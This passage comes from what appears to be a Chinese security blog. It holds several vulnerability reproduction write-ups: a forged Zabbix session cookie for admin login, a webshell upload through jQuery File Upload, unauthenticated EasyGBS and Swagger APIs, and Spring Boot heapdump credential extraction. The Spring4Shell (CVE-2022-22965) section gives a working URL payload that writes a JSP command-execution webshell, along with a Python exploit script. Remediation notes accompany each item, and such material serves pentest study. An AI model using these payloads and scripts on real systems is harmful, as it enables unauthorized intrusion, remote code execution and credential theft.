+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&quot;sessionid&quot;:&quot;4e468962568f645232585a9d73532bf1&quot;,&quot;sign&quot;:&quot;e5a421ca587c0539c9f83560ab9975496109ca2ac71f781eff47c656b165e2c8&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再将上方值进行base64编码</p>
+<p><img src="https://s2.loli.net/2022/07/25/vdrF6nDXYA39wCI.png" alt="image-20220725013812468"></p>
+<p>构造payload，将Cookie字段替换成下列payload再发送数据包，即可登录成功（本文测试站点不存在该漏洞）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiNGU0Njg5NjI1NjhmNjQ1MjMyNTg1YTlkNzM1MzJiZjEiLCJzaWduIjoiZTVhNDIxY2E1ODdjMDUzOWM5ZjgzNTYwYWI5OTc1NDk2MTA5Y2EyYWM3MWY3ODFlZmY0N2M2NTZiMTY1ZTJjOCJ9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/25/2thvQGZbRenSiCm.png" alt="image-20220725020834242"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/Jquery.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/Jquery.html" class="post-title-link" itemprop="url">JQuery</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-22 18:14:49" itemprop="dateCreated datePublished" datetime="2022-07-22T18:14:49+08:00">2022-07-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:41:14" itemprop="dateModified" datetime="2023-04-16T10:41:14+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="jQuery-File-Upload-未经身份验证的任意文件上传">1. jQuery File Upload 未经身份验证的任意文件上传</h1><h1 id="风险描述">2. 风险描述:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery-File-Upload是一个应用广泛的文件上传工具，该漏洞的主要原因为jQuery File Upload的安全限制被绕过，通过该漏洞攻击者可上传web shell进而造成远程命令执行。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/22/rDYqwxzuXPkbWB2.png" alt="image-20220722140221363"></p>
+<h1 id="影响版本">3. 影响版本:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jQuery-File-Upload &lt;= 9.22.0</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用">4. 漏洞利用:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">扫描后台，发现jquery-file-upload</span><br><span class="line">/Public/global/plugins/jquery-file-upload/</span><br><span class="line">添加文件开始上传冰蝎木马，上传成功，目录如下</span><br><span class="line">/Public/global/plugins/jquery-file-upload/server/php/files/shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/XdP3EcoDyLGCWhx.png" alt="image-20220722140657608"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/O5Sb3naAWKyxRFU.png" alt="image-20220722140409350"></p>
+<h4 id="修复建议">4.0.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、官方已经在9.22.1更新中修复该漏洞，请及时更新。</span><br><span class="line">更新链接：https://github.com/blueimp/jQuery-File-Upload</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EasyGBS.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EasyGBS.html" class="post-title-link" itemprop="url">EasyGBS</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-20 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-20T15:56:49+08:00">2022-07-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:39:06" itemprop="dateModified" datetime="2023-04-16T10:39:06+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/" itemprop="url" rel="index"><span itemprop="name">网络设备</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="EasyGBS未授权访问">1. EasyGBS未授权访问</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以直接访问平台的API接口文档，从而获取系统的API接口造成信息泄露。再通过泄露的账号密码登录到EasyGBS后台。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">1.2. 漏洞复现:</h2><p><img src="https://s2.loli.net/2022/07/20/cWCPnp1HkDI8TFx.png" alt="image-20220720125708082"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问下面API接口网址获取登录账号密码</span><br><span class="line">/api/v1/userlist?pageindex=0&amp;pagesize=10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/20/kUiXEVRHJsbLxI7.png" alt="image-20220720124835234"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过burp抓包发现用户名密码为GET方式传参，修改成正确的用户名和password即可登录。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/20/2SEonP4iaekRu6Q.png" alt="image-20220720125958474"></p>
+<p><img src="https://s2.loli.net/2022/07/20/uWcxLNgviEYAh7Q.png" alt="image-20220720124649601"></p>
+<h4 id="修复建议">1.2.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、禁止API接口未授权访问。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E6%A1%86%E6%9E%B6/SpringBoot.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E6%A1%86%E6%9E%B6/SpringBoot.html" class="post-title-link" itemprop="url">SpringBoot</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-17 15:56:49" itemprop="dateCreated datePublished" datetime="2022-07-17T15:56:49+08:00">2022-07-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 11:16:12" itemprop="dateModified" datetime="2023-04-16T11:16:12+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E6%A1%86%E6%9E%B6/" itemprop="url" rel="index"><span itemprop="name">WEB框架</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="druid未授权访问">1. druid未授权访问</h1><h2 id="漏洞描述：">1.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Druid由阿里巴巴数据库出品，为监控而生的数据库连接池，并且Druid可以提供监控，监控SQL的执行时间、监控Web URI的请求、Session监控等功能，使用广泛。Druid本身是不存在漏洞的，Druid未授权访问是因为开发者配置的不够全面，导致攻击者输入ip/druid/index.html即可直接即可登录到Druid监控界面。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害：">1.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">攻击者可以通过/druid/websession.html泄露的Session登录后台，或者对URI监控中的接口进行访问测试，</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：">1.3. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415221133579.png" alt="image-20230415221133579"></p>
+<h2 id="漏洞利用：">1.4. 漏洞利用：</h2><ol>
+<li><p>通过URI测试接口</p>
+<p>通过拼接URI进行API接口测试，这个看运气，看接口是否存在未授权，是否存在参数缺失提示等等…，下面测试图访问接口的时候会提示什么参数缺失，所以测到了SQL注入。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222426755.png" alt="image-20230415222426755"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222655928.png" alt="image-20230415222655928"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415222811864.png" alt="image-20230415222811864"></p>
+</li>
+<li><p>通过Seesion登录后台</p>
+</li>
+</ol>
+<h2 id="漏洞修复：">1.5. 漏洞修复：</h2><ol>
+<li>添加登录用户名密码</li>
+<li>禁用druid监控页面</li>
+</ol>
+<h1 id="SpringBoot未授权访问">2. SpringBoot未授权访问</h1><h2 id="漏洞描述：-1">2.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">未授权访问漏洞，是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害：-1">2.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">认证模式可绕过，不登录即可通过 URL 或其他方式访问登陆后页面。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：-1">2.3. 漏洞复现：</h2><p>一般dirsearch都能扫到，前提是路径得对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/actuator</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/heapdump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415223427505.png" alt="image-20230415223427505"></p>
+<h2 id="漏洞利用：-1">2.4. 漏洞利用：</h2><h3 id="通过heapdump-tools读取内存">2.4.1. 通过heapdump_tools读取内存</h3><p><a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool">heapdump_tools</a>,下载链接在超链接文档内。</p>
+<p>可以通过读取内存，获取到一些敏感信息，例如内网的数据库连接密码，nacos配置密码，oss等accesskey等等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">java -jar heapdump_tools .\heapdump</span><br><span class="line"></span><br><span class="line">[-] Start jhat, waiting...</span><br><span class="line">[-] fing object count: 100000</span><br><span class="line">[-] too many object,please input 0/1 to choose mode.</span><br><span class="line">0. (search data, may can&#x27;t find some data, can&#x27;t use function num=,len=).</span><br><span class="line">1. (load all object, need wait a few minutes).</span><br><span class="line">&gt; 0             // 这里选择0，通过关键字搜索内存信息。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230415224802207.png" alt="image-20230415224802207"></p>
+<h3 id="通过MAT读取内存">2.4.2. 通过MAT读取内存</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、下载到heapdump文件</span><br><span class="line">2、使用 MAT 获得 jvm heap 中的密码明文</span><br><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line">或</span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905124719657.png" alt="image-20220905124719657"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905124855386.png" alt="image-20220905124855386"></p>
+<h2 id="漏洞修复：-1">2.5. 漏洞修复：</h2><ol>
+<li>禁止在代码中存储可返回的敏感数据、删除代码中的敏感信息</li>
+<li>禁止在web上存放可访问的敏感文件、删除web中的敏感文件</li>
+</ol>
+<h1 id="Swagger-UI-未授权访问">3. Swagger-UI 未授权访问</h1><h2 id="漏洞描述：-2">3.1. 漏洞描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务，JAVA在金融机构开发语言的地位一直居高不下，而作为JAVA届服务端的大一统框架Spring，便将Swagger规范纳入自身的标准，建立了Spring-swagger项目，所以在实际测试环境中，基于spring框架的swagger-ui接口展示及调试文档页面最为常见。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞危害：-2">3.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过翻查文档，得到api接口，点击parameters，即可得到该api接口的详细参数。直接构造参数发包，通过回显可以得到大量的用户信息，包含了手机号，邮箱等。</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：-2">3.3. 漏洞复现：</h2><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105133075.png" alt="image-20230416105133075"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105231895.png" alt="image-20230416105231895"></p>
+<h2 id="漏洞利用：-2">3.4. 漏洞利用：</h2><p>Postman+Burp实现接口自动测试。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/127878364">教学链接</a></p>
+<ol>
+<li><p>点击Import，输入api-docs链接，导入API。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105423439.png" alt="image-20230416105423439"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105522038.png" alt="image-20230416105522038"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416105722559.png" alt="image-20230416105722559"></p>
+</li>
+<li><p>设置Environments，**此处Variable一定要设置成baseUrl(区分大小写，不然识别不到)**，后面两个参数设置成需要拼接API的路径，然后点击右上角Save保存。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110214661.png" alt="image-20230416110214661"></p>
+</li>
+<li><p>回到APIs选择指定的Environments，点击baseUrl可以查看是否配置成功，然后随便点个接口Send测试一下请求是否正常。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110443022.png" alt="image-20230416110443022"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110529154.png" alt="image-20230416110529154"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110715708.png" alt="image-20230416110715708"></p>
+</li>
+<li><p>Postman配置下游Burp代理，再Send发送测试Burp是否能正确接收到请求。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110804658.png" alt="image-20230416110804658"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416110829114.png" alt="image-20230416110829114"></p>
+</li>
+<li><p>批量自动化测试，点击APIs第一行，再点击<code>Test and Automation</code>再点击Run,再点击Run，即可完成。</p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111003596.png" alt="image-20230416111003596"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111116627.png" alt="image-20230416111116627"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416111244628.png" alt="image-20230416111244628"></p>
+</li>
+<li><p>可以burp下游再配置xray…</p>
+</li>
+</ol>
+<h1 id="CVE-2022-22965">4. CVE-2022-22965</h1><h2 id="漏洞原理：">4.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。CVE-2022-22965漏洞是CVE-2010-1622漏洞的绕过。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本：">4.2. 影响版本：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、JDK ≥ 9</span><br><span class="line">2、Spring Framework 版本为5.3.0 - 5.3.17，5.2.0 - 5.2.19或更旧的版本</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建：">4.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">攻击者: win11 192.168.179.1</span><br><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/spring/CVE-2022-22965</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br><span class="line">		访问靶机8080端口,出现下图页面即搭建成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/We8Mp6zS1o5f4Bd.png" alt="image-20220710091019975"></p>
+<h2 id="漏洞复现：-3">4.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、使用 burp 进行抓包，发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件 // 注意若在同一机器上搭建靶场，靶场会占用8080端口，需更改burp代理端口</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">将 Connection:close 后面部分替换成</span><br><span class="line">	suffix: %&gt;//</span><br><span class="line">	c1: Runtime</span><br><span class="line">	c2: &lt;%</span><br><span class="line">	DNT: 1</span><br><span class="line">	Content-Length: 2</span><br><span class="line">	</span><br><span class="line">再构造URL为下面代码:	// 记得前面加?</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class="line"></span><br><span class="line">实际发送数据包如下图所示:		Content-Length: 2 发送成功后会变为 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/ymCs9FHuWlEbiPe.png" alt="image-20220710132339932"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2、访问 /tomcatwar.jsp?pwd=j&amp;cmd=whoami // 命令执行成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/1lNAjbVvEMmd2fg.png" alt="image-20220710103149941"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL参数解析:</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.pattern=xxx（写入shell内容）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp（修改tomcat配置日志文件后缀jsp）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT（写入shell在网站根目录）</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell（写入shell文件名称）class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=（文件日期格式,实际构造为空值即可）</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复">4.5. 漏洞修复:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将 Spring Framework 升级至安全版本</span><br><span class="line">2、JDK 版本退回到9以下</span><br></pre></td></tr></table></figure>
+
+<h2 id="EXP">4.6. EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;suffix&quot;: &quot;%&gt;//&quot;,</span><br><span class="line">    &quot;c1&quot;: &quot;Runtime&quot;,</span><br><span class="line">    &quot;c2&quot;: &quot;&lt;%&quot;,</span><br><span class="line">    &quot;DNT&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">payload = &quot;?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    url = sys.argv[1]</span><br><span class="line">    url_spli = f&#x27;&#123;url&#125;&#123;payload&#125;&#x27;</span><br><span class="line">    requests.get(url=url_spli, headers=headers)</span><br><span class="line">    shell = f&#x27;&#123;url&#125;/tomcatwar.jsp?pwd=j&amp;cmd=whoami&#x27;</span><br><span class="line">    resp = requests.get(url=shell, headers=headers)</span><br><span class="line">    if resp.status_code == 200:</span><br><span class="line">        print(f&quot;[+] Shell : &#123;shell&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;[-] Not Spring4shell&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/PHP/php8.1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
